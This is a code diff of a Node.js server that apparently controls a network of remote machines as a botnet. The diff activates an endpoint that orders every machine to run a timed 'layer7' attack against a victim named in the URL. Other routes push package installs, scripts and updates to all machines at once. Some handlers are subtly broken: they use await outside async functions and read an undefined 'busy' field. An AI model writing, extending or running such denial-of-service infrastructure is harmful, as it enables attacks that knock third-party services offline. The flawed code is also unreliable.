@@ -284,6 +284,17 @@ async function fetchScripts() {
         })
 }
 
+async function dumpGlobals() {
+    return axios.patch(database.globals, Globals)
+        .then(res => {
+            Globals.latestGlobalsDump = Date.now()
+            console.log("Globals dumped.");
+        })
+        .catch(err => {
+            console.error(err);
+        })
+}
+
 function updateMasterSubdomain() {
     let traceid = logID()
     if (config.domainConnection) {
@@ -411,37 +422,9 @@ app.get('/setup', (req, res) => {
                 requested = requested.replace("$SERVICELINK", SERVICELINK)
                 var regex = new RegExp("SERVICENAME", "g");
                 requested = requested.replace(regex, SERVICENAME)
-                //res.send(200, (requested))
             }
         }
-        /*
-        .catch(err => {
-            if (scid === "script_json") {
-                let searchSatisfied = false
-                for (let index = 0; index < SCRIPTS.length; index++) {
-                    const element = SCRIPTS[index];
-                    if (element.id === detid) {
-                        //console.log(element);
-                        searchSatisfied = true
-                        res.send(element)
-                    }
-                }
-                if (!searchSatisfied) {
-                    res.send(500, {
-                        error: {
-                            message: "SCRIPT_DOES_NOT_EXIST",
-                            innerResponse: `The script with ID'${detid}' does not exist in the dictionary.`
-                        }
-                    })
-                }
-            }
-            else {
-                console.log(err);
-                res.send(500, { error: { message: err.message } })
-            }
-        })*/
     }
-
 })
 
 
@@ -531,17 +514,27 @@ app.get('/all/installscript/:scriptid', async (req, res) => {
     res.send(200, { asked: machines.asked.length, responded: machines.responded.length, busy: machines.responded.busy, data: machines })
 })
 app.get('/all/npminstall/:module', (req, res) => {
-    for (let index = 0; index < Machines.count(); index++) {
-        axios.get(`http://${activeMachinesList[index]}:${Globals.port.number}/npminstall/${req.params.module}`)
+    //axios.get(`http://${activeMachinesList[index]}:${Globals.port.number}/npminstall/${req.params.module}`)
+    let machines = {
+        all: Machines.list(),
+        asked: [],
+        responded: [],
+        busy: []
+    }
+    for (let index = 0; index < (machines.all).length; index++) {
+        let currentMachine = ((machines.all)[index])
+        machines.asked.push(currentMachine)
+        await axios.get(`http://${currentMachine.id}:${Globals.port.number}/npminstall/${req.params.module}`)
             .then(res => {
                 console.log(res.data)
+                machines.responded.push(currentMachine)
             })
             .catch(err => {
-                console.error(err);
+                console.error(err.response.data);
+                machines.busy.push(currentMachine)
             })
-
     }
-    res.send(200, "OKAY")
+    res.send(200, { asked: machines.asked.length, responded: machines.responded.length, busy: machines.responded.busy, data: machines })
 })
 
 app.get('/all/attacklayer7/:methodID/:victim/:time/:attackID', async (req, res) => {
@@ -554,7 +547,7 @@ app.get('/all/attacklayer7/:methodID/:victim/:time/:attackID', async (req, res) 
     for (let index = 0; index < (machines.all).length; index++) {
         let currentMachine = ((machines.all)[index])
         machines.asked.push(currentMachine)
-        await axios.get(`http://${currentMachine.id}:${Globals.port.number}/status`) //layer7/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`)
+        await axios.get(`http://${currentMachine.id}:${Globals.port.number}/layer7/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`)
             .then(res => {
                 console.log(res.data)
                 machines.responded.push(currentMachine)
@@ -564,22 +557,30 @@ app.get('/all/attacklayer7/:methodID/:victim/:time/:attackID', async (req, res) 
                 machines.busy.push(currentMachine)
             })
     }
-    //await delay(3000)
     res.send(200, { asked: machines.asked.length, responded: machines.responded.length, busy: machines.responded.busy, data: machines })
 })
 
 app.get('/all/update', (req, res) => {
-    for (let index = 0; index < Machines.count(); index++) {
-        axios.get(`http://${activeMachinesList[index]}:${Globals.port.number}/update`)
+    let machines = {
+        all: Machines.list(),
+        asked: [],
+        responded: [],
+        busy: []
+    }
+    for (let index = 0; index < (machines.all).length; index++) {
+        let currentMachine = ((machines.all)[index])
+        machines.asked.push(currentMachine)
+        await axios.get(`http://${currentMachine.id}:${Globals.port.number}/update`)
             .then(res => {
                 console.log(res.data)
+                machines.responded.push(currentMachine)
             })
             .catch(err => {
                 console.error(err.response.data);
+                machines.busy.push(currentMachine)
             })
-
     }
-    res.send(200, "OKAY")
+    res.send(200, { asked: machines.asked.length, responded: machines.responded.length, busy: machines.responded.busy, data: machines })
 })
 
 app.get('/machines/', (req, res) => {
@@ -598,8 +599,9 @@ app.get('/machines/testReachability/:timeout', async (req, res) => {
     let unreachable = []
     let timeout_ = 5
     if (!isNaN(req.params.timeout)) {
-        if (req.params.timeout <= 10)
+        if (req.params.timeout <= 10) {
             timeout_ = parseInt(req.params.timeout)
+        }
     }
     for (let index = 0; index < Machines.count(); index++) {
         axios.get(`http://${activeMachinesList[index]}:${Globals.port.number}/status`, {
@@ -754,3 +756,10 @@ app.post('/mgmt/portElusion/', async (req, res) => {
 app.listen(80, () => console.log(`App listening on port ${"80"}!`))
 
 
+setInterval(() => {
+    dumpGlobals()
+}, 30000);
+
+setInterval(() => {
+    checkPortExpiry()
+}, 30000);
